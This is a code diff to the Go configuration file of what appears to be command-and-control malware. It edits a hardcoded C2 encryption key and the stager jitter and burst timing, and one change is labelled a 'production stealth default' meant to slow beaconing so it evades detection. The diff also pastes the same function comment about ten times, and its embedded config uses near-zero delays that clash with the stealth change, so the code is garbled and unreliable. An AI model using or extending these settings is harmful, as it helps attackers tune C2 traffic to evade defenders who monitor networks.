@@ -59,10 +59,10 @@ func DefaultConfig() Config {
 		EncryptionKey: "MySecretC2Key123!@#DefaultChange",
 		Debug:         false,
 		StagerJitter: StagerJitter{
-			JitterMinMs:       100,
-			JitterMaxMs:       500,
-			ChunksPerBurst:    10,
-			BurstPauseMs:      2000,
+			JitterMinMs:       60000,  // 60 seconds - production stealth default
+			JitterMaxMs:       120000, // 120 seconds
+			ChunksPerBurst:    5,      // Moderate burst size
+			BurstPauseMs:      120000, // 120 seconds between bursts
 			RetryDelaySeconds: 3,
 			MaxRetries:        5,
 		},
@@ -216,6 +216,26 @@ func LoadConfig() (Config, error) {
 // Returns the config and true if embedded config is available, otherwise returns empty config and false
 // tryLoadEmbeddedConfig attempts to load embedded configuration
 // Returns the config and true if embedded config is available, otherwise returns empty config and false
+// tryLoadEmbeddedConfig attempts to load embedded configuration
+// Returns the config and true if embedded config is available, otherwise returns empty config and false
+// tryLoadEmbeddedConfig attempts to load embedded configuration
+// Returns the config and true if embedded config is available, otherwise returns empty config and false
+// tryLoadEmbeddedConfig attempts to load embedded configuration
+// Returns the config and true if embedded config is available, otherwise returns empty config and false
+// tryLoadEmbeddedConfig attempts to load embedded configuration
+// Returns the config and true if embedded config is available, otherwise returns empty config and false
+// tryLoadEmbeddedConfig attempts to load embedded configuration
+// Returns the config and true if embedded config is available, otherwise returns empty config and false
+// tryLoadEmbeddedConfig attempts to load embedded configuration
+// Returns the config and true if embedded config is available, otherwise returns empty config and false
+// tryLoadEmbeddedConfig attempts to load embedded configuration
+// Returns the config and true if embedded config is available, otherwise returns empty config and false
+// tryLoadEmbeddedConfig attempts to load embedded configuration
+// Returns the config and true if embedded config is available, otherwise returns empty config and false
+// tryLoadEmbeddedConfig attempts to load embedded configuration
+// Returns the config and true if embedded config is available, otherwise returns empty config and false
+// tryLoadEmbeddedConfig attempts to load embedded configuration
+// Returns the config and true if embedded config is available, otherwise returns empty config and false
 func tryLoadEmbeddedConfig() (Config, bool) {
 	// Embedded configuration from build time
 	embeddedConfig := Config{
@@ -230,10 +250,10 @@ func tryLoadEmbeddedConfig() (Config, bool) {
 		EncryptionKey: "MySecretC2Key123!@#DefaultChange",
 		Debug:         false,
 		StagerJitter: StagerJitter{
-			JitterMinMs:       100,
-			JitterMaxMs:       150,
-			ChunksPerBurst:    10,
-			BurstPauseMs:      100,
+			JitterMinMs:       1,
+			JitterMaxMs:       2,
+			ChunksPerBurst:    20,
+			BurstPauseMs:      1,
 			RetryDelaySeconds: 3,
 			MaxRetries:        5,
 		},
